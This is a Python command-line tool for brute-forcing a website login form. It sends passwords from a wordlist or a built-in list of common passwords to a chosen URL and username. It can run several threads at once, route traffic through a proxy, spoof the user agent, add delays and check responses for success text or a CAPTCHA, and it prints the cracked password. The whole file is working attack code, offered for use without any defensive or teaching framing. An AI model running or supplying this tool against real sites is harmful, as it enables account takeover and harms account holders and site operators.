import requests
import argparse
import sys
import re
import yaml
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
from colorama import Fore, Style, init
from queue import Queue
import signal

init(autoreset=True)

# Global for graceful shutdown and result
stop_event = threading.Event()
result_lock = threading.Lock()
first_result = {'found': None}
log_lock = threading.Lock()

def signal_handler(sig, frame):
    print(Fore.YELLOW + '\n[!] Interrupted by user. Exiting gracefully...')
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)

def load_config(config_path):
    if not config_path:
        return {}
    try:
        with open(config_path, 'r') as f:
            return yaml.safe_load(f)
    except Exception as e:
        print(Fore.RED + f"[!] Could not read config file: {e}")
        sys.exit(1)

def log_result(logfile, message):
    if logfile:
        with log_lock:
            with open(logfile, 'a') as f:
                f.write(message + '\n')
                f.flush()

def detect_success(response, success_indicator, success_regex):
    # Check for redirects (common on successful login)
    if response.history:
        return True
    # Check for success indicator in response text
    text = response.text.lower()
    if success_indicator and success_indicator.lower() in text:
        return True
    if success_regex:
        if re.search(success_regex, response.text):
            return True
    return False

def detect_failure(response, failure_indicator, failure_regex):
    text = response.text.lower()
    if failure_indicator and failure_indicator.lower() in text:
        return True
    if failure_regex:
        if re.search(failure_regex, response.text):
            return True
    return False

def detect_captcha(response):
    captcha_keywords = ["captcha", "recaptcha", "i am not a robot", "please verify"]
    text = response.text.lower()
    return any(word in text for word in captcha_keywords)

def merge_config_arg(arg, config_val, default=None):
    if arg is not None:
        return arg
    if config_val is not None:
        return config_val
    return default

def brute_force_worker(url, username, password, username_field, password_field, headers, proxies, timeout, success_indicator, failure_indicator, success_regex, failure_regex, logfile, progress_queue, delay, debug):
    if stop_event.is_set():
        progress_queue.put(1)
        return None
    data = {username_field: username, password_field: password}
    try:
        session = requests.Session()
        response = session.post(url, data=data, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=True)
        if debug:
            print(Fore.MAGENTA + f"[DEBUG] Tried {password}: Status={response.status_code}, URL={response.url}, Response snippet: {response.text[:200]}")
        if detect_captcha(response):
            msg = f"[!] CAPTCHA detected after trying: {password}"
            print(Fore.YELLOW + msg)
            log_result(logfile, msg)
            stop_event.set()
            progress_queue.put(1)
            return None
        if detect_success(response, success_indicator, success_regex):
            with result_lock:
                if not first_result['found']:
                    first_result['found'] = password
                    msg = f"[SUCCESS] Password found: {password}"
                    print(Fore.GREEN + msg)
                    log_result(logfile, msg)
                    stop_event.set()
            progress_queue.put(1)
            return password
        elif detect_failure(response, failure_indicator, failure_regex):
            msg = f"[FAILURE] Tried: {password} - explicit failure detected"
            print(Fore.RED + msg)
            log_result(logfile, msg)
        else:
            msg = f"[FAILURE] Tried: {password} - failed"
            print(Fore.RED + msg)
            log_result(logfile, msg)
    except requests.exceptions.RequestException as e:
        msg = f"[ERROR] Error trying {password}: {e}"
        print(Fore.YELLOW + msg)
        log_result(logfile, msg)
        sleep(1)
    finally:
        progress_queue.put(1)
        if delay > 0:
            sleep(delay)
    return None

def brute_force_login(
    url, username, password_list, username_field, password_field, success_indicator, failure_indicator, success_regex, failure_regex,
    proxy=None, user_agent=None, progress_interval=10, logfile=None, threads=4, timeout=10, delay=0, debug=False
):
    headers = {'User-Agent': user_agent} if user_agent else {}
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    total = len(password_list)
    progress_queue = Queue()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for password in password_list:
            password = password.strip()
            if not password:
                continue
            if stop_event.is_set():
                break
            futures.append(executor.submit(
                brute_force_worker, url, username, password, username_field, password_field, headers, proxies, timeout,
                success_indicator, failure_indicator, success_regex, failure_regex, logfile, progress_queue, delay, debug
            ))
        tried = 0
        for future in as_completed(futures):
            tried += progress_queue.get()
            if tried % progress_interval == 0 or tried == total:
                print(Fore.CYAN + f"[PROGRESS] {tried}/{total} passwords tried...")
            if stop_event.is_set():
                break
    found = first_result['found']
    if not found:
        print(Fore.YELLOW + "[RESULT] Password not found in the provided list.")
        log_result(logfile, "[RESULT] Password not found in the provided list.")
    return found

def load_passwords_from_file(file_path, max_passwords=1000):
    """Load passwords from file with a limit for performance"""
    passwords = []
    try:
        with open(file_path, 'r') as f:
            count = 0
            for line in f:
                line = line.strip()
                if line and count < max_passwords:
                    passwords.append(line)
                    count += 1
                if count >= max_passwords:
                    break
        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from {file_path}")
        return passwords
    except Exception as e:
        print(Fore.RED + f"[!] Error reading {file_path}: {e}")
        return []

def get_builtin_passwords():
    """Return a list of common passwords for fallback"""
    return [
        "123456", "password", "123456789", "12345678", "12345", "qwerty", "abc123",
        "football", "1234567", "monkey", "111111", "letmein", "1234", "1234567890",
        "dragon", "baseball", "sunshine", "princess", "master", "hello", "freedom",
        "whatever", "qazwsx", "trustno1", "jordan", "harley", "buster", "thomas",
        "tigger", "robert", "soccer", "batman", "test", "pass", "killer", "hunter",
        "mike", "shadow", "mustang", "dennis", "fisher", "marshall", "cooper",
        "steve", "caesar", "mickey", "cowboy", "malcolm", "sievert", "buffalo",
        "swimming", "dolphins", "gandalf", "packers", "alexis", "player", "sunflower",
        "florida", "ferrari", "rainbow", "hammer", "silver", "orange", "88888888",
        "internet", "scooter", "orange", "golfer", "cookie", "richard", "summer",
        "heather", "hammer", "yankees", "joshua", "maggie", "enter", "ashley",
        "thunder", "cooper", "marvin", "dakota", "blowme", "spider", "miller",
        "test", "hunter", "chicago", "tigers", "killer", "gateway", "gators",
        "love", "5201314", "zoosk", "freedom", "ninja", "cameron", "starwars",
        "fishing", "cowboys", "enigma", "bheem", "matt", "peanut", "morgan",
        "wizard", "cooper", "tester", "trustno1", "butter"
    ]

def main():
    parser = argparse.ArgumentParser(description="Brute-force login script")
    parser.add_argument('--url', help='Target login URL', required=False)
    parser.add_argument('--username', help='Username to use', required=False)
    parser.add_argument('--wordlist', help='Path to password list file', required=False)
    parser.add_argument('--config', help='Path to YAML config file', required=False)
    parser.add_argument('--username-field', help='Form field name for username', default=None)
    parser.add_argument('--password-field', help='Form field name for password', default=None)
    parser.add_argument('--success-indicator', help='Text/HTML indicating success', default=None)
    parser.add_argument('--failure-indicator', help='Text/HTML indicating failure', default=None)
    parser.add_argument('--success-regex', help='Regex for success detection', default=None)
    parser.add_argument('--failure-regex', help='Regex for failure detection', default=None)
    parser.add_argument('--proxy', help='Proxy URL (optional)', default=None)
    parser.add_argument('--user-agent', help='Custom User-Agent string (optional)', default=None)
    parser.add_argument('--progress-interval', type=int, help='Show progress every N attempts (default: 10)', default=10)
    parser.add_argument('--logfile', help='Log file to save results', default=None)
    parser.add_argument('--threads', type=int, help='Number of threads (default: 4)', default=4)
    parser.add_argument('--timeout', type=int, help='Request timeout in seconds (default: 10)', default=10)
    parser.add_argument('--delay', type=float, help='Delay (in seconds) between requests per thread (default: 0)', default=0)
    parser.add_argument('--debug', action='store_true', help='Print server response for each attempt')
    args = parser.parse_args()

    config = load_config(args.config)
    target_url = merge_config_arg(args.url, config.get('url'), None)
    username = merge_config_arg(args.username, config.get('username'), None)
    wordlist_path = merge_config_arg(args.wordlist, config.get('wordlist'), None)
    username_field = merge_config_arg(args.username_field, config.get('username_field'), 'username')
    password_field = merge_config_arg(args.password_field, config.get('password_field'), 'password')
    success_indicator = merge_config_arg(args.success_indicator, config.get('success_indicator'), 'welcome')
    failure_indicator = merge_config_arg(args.failure_indicator, config.get('failure_indicator'), None)
    success_regex = merge_config_arg(args.success_regex, config.get('success_regex'), None)
    failure_regex = merge_config_arg(args.failure_regex, config.get('failure_regex'), None)
    proxy = merge_config_arg(args.proxy, config.get('proxy'), None)
    user_agent = merge_config_arg(args.user_agent, config.get('user_agent'), None)
    progress_interval = int(merge_config_arg(args.progress_interval, config.get('progress_interval'), 10))
    logfile = merge_config_arg(args.logfile, config.get('logfile'), None)
    threads = int(merge_config_arg(args.threads, config.get('threads'), 4))
    timeout = int(merge_config_arg(args.timeout, config.get('timeout'), 10))
    delay = float(merge_config_arg(args.delay, config.get('delay'), 0))
    debug = bool(args.debug or config.get('debug', False))

    # Get user input
    if not target_url:
        target_url = input("Enter target login URL: ").strip()
    if not username:
        username = input("Enter username: ").strip()
    
    # Handle password loading
    passwords = []
    if not wordlist_path:
        print(Fore.CYAN + "\n[INFO] Password options:")
        print(Fore.CYAN + "1. Use passwords.txt (default)")
        print(Fore.CYAN + "2. Use common_passwords.txt")
        print(Fore.CYAN + "3. Use password_libraries/10k_common.txt")
        print(Fore.CYAN + "4. Use built-in passwords")
        print(Fore.CYAN + "5. Enter custom path")
        
        choice = input("\nEnter choice (1-5) or press Enter for default (1): ").strip()
        
        if choice == "2":
            wordlist_path = "common_passwords.txt"
        elif choice == "3":
            wordlist_path = "password_libraries/10k_common.txt"
        elif choice == "4":
            wordlist_path = "builtin"
        elif choice == "5":
            wordlist_path = input("Enter path to password list file: ").strip()
        else:
            wordlist_path = "passwords.txt"
    
    # Load passwords
    if wordlist_path == "builtin":
        print(Fore.CYAN + "[INFO] Using built-in passwords...")
        passwords = get_builtin_passwords()
    else:
        passwords = load_passwords_from_file(wordlist_path, max_passwords=1000)
        if not passwords:
            print(Fore.YELLOW + "[!] Could not load passwords from file. Using built-in passwords.")
            passwords = get_builtin_passwords()

    if not passwords:
        print(Fore.RED + "[!] No passwords available. Exiting.")
        sys.exit(1)
    
    print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords for brute force attack")
    print(Fore.CYAN + f"[INFO] Starting brute force attack against: {target_url}")
    print(Fore.CYAN + f"[INFO] Target username: {username}")
    print(Fore.CYAN + f"[INFO] Press Ctrl+C to stop the attack at any time")
    print(Fore.CYAN + "=" * 60)

    found = brute_force_login(
        target_url,
        username,
        passwords,
        username_field,
        password_field,
        success_indicator,
        failure_indicator,
        success_regex,
        failure_regex,
        proxy=proxy,
        user_agent=user_agent,
        progress_interval=progress_interval,
        logfile=logfile,
        threads=threads,
        timeout=timeout,
        delay=delay,
        debug=debug
    )
    if found:
        print(Fore.GREEN + f"\n[RESULT] Password for user '{username}' is: {found}")
        log_result(logfile, f"[RESULT] Password for user '{username}' is: {found}")
    else:
        print(Fore.YELLOW + f"\n[RESULT] No valid password found for user '{username}'.")
        log_result(logfile, f"[RESULT] No valid password found for user '{username}'.")

if __name__ == "__main__":
    main() 